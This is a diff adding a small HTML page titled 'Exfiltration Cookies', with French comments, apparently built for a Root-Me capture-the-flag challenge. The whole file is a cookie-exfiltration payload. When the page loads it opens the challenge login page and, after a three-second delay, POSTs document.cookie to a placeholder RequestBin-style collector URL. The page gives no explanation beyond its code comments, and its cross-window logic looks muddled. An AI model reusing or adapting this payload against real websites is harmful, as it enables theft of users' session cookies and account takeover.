@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exfiltration Cookies</title>
+</head>
+<body>
+  <script>
+    // Fonction qui s'exécute dès que la page est chargée
+    window.onload = function() {
+      // Ouvrir la fenêtre cible (RootMe dans cet exemple)
+      let targetWindow = window.open('http://challenge01.root-me.org:58003/login');
+
+      // Attendre 3 secondes pour que la fenêtre se charge et envoyer les cookies à RequestBin
+      setTimeout(() => {
+        if (targetWindow) {
+          try {
+            // Récupérer les cookies de la fenêtre parent
+            targetWindow.opener.fetch('https://your-requestbin-url.com', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+              },
+              body: 'cookies=' + encodeURIComponent(document.cookie),
+            });
+          } catch (err) {
+            console.error('Erreur lors de l’accès aux cookies :', err);
+          }
+        } else {
+          console.error("Impossible d'ouvrir la fenêtre cible.");
+        }
+      }, 3000); // Délai de 3 secondes pour s'assurer que la fenêtre se charge
+    };
+  </script>
+</body>
+</html>
